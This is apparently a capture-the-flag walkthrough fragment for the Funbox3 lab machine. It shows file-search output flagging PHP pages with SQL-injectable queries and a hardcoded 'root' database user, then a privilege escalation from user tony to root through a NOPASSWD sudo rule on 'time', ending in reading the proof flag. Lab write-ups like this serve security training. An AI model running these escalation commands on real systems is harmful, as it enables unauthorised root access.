/var/www/html/gym/profile/i.php:$query = "SELECT * FROM `members` WHERE username = '$username'";
/var/www/html/gym/profile/index.php: $username = $_SESSION['username'];
/var/www/html/gym/profile/index.php:$query = "SELECT * FROM `members` WHERE username = '$username'";                                                                
/var/www/html/gym/register.php:  <input type="text" class="form-control" placeholder="Username" name="username" id="username">
/var/www/html/gym/workouts/index.php:  $username = $_SESSION['username'];
/var/www/html/gym/workouts/index.php:$query = "SELECT * FROM `members` WHERE username = '$username'";                                                               
/var/www/html/index.php:                                        <input type="text" name="email" id="txtusername" class="form-control">                                 
/var/www/html/leftbar.php:          <div class="username" style="font-size:12px;"><?php echo $_SESSION['name'];?></div>
/var/www/html/store/controllers/DatabaseTalking/Talking.php:        Talking::$userName = $user;                                                                     
/var/www/html/store/controllers/DatabaseTalking/Talking.php:    private static $userName = 'root';                                                                  
/var/www/html/store/verify.php:         if($email == $row['username'] && $pswd == $row['password']){

[+] Searching specific hashes inside files - less false positives (limit 70)

```

```
sudo -l

User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
```

time命令提权

```
sudo -u root time /bin/bash
tony@funbox3:~$ sudo time whoami
root
0.00user 0.00system 0:00.00elapsed ?%CPU (0avgtext+0avgdata 2180maxresident)k
0inputs+0outputs (0major+98minor)pagefaults 0swaps
tony@funbox3:~$ sudo time /bin/sh
# whoami
root
# /bin/bash
root@funbox3:/home/tony# cd /root
root@funbox3:~# ls
proof.txt  root.flag  snap
root@funbox3:~# cat root.flag
Your flag is in another file...
root@funbox3:~# ls
proof.txt  root.flag  snap
root@funbox3:~# cat proof.txt
f21e075a11d44f680bedce1f6f847087
root@funbox3:~# 

```

